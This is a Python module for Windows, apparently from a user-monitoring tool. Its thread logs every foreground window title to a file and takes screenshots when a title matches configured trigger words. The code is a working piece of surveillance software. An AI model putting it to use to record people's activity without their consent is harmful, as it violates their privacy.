import win32gui, time, win32process
from threading import Thread
from Screenshot import Screenshot
from Util import Util



class WindowTracker(Thread):

    def __init__(self, config, screenshot):
        Thread.__init__(self, name='window tracking')
        self.__config = config
        self.__screenshot = screenshot
        self.__activeWindow = None
        self.__screenshotTimer = 0



    def run(self):
        while True:
            if self.__config.windowTrackingIsActive:
                time.sleep(self.__config.samplingFrequency)
                activeWindow = win32gui.GetForegroundWindow()
                activeWindowText = win32gui.GetWindowText(activeWindow)
                self.__examineWindow(activeWindowText)
                self.__screenshotHandler(activeWindowText)



    def __examineWindow(self, activeWindowTitle:str) -> None:
        if self.__activeWindow != activeWindowTitle:
            self.__activeWindow = activeWindowTitle
            windowTitle = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
            if self.__config.debug:
                print(windowTitle)
            Util.fileOut(self.__config.logPath + self.__config.logFileName, windowTitle)



    def __screenshotHandler(self, activeWindowText:str) -> None:
        for trigger in self.__config.screenshotTrigger.split(' '):
            if trigger in activeWindowText.lower():
                self.__screenshotTimer += 1
                if self.__config.debug:
                    print(self.__screenshotTimer)
                if self.__screenshotTimer % self.__config.screenshotFrequency == 0:
                    self.__screenshot.takeScreenshot()
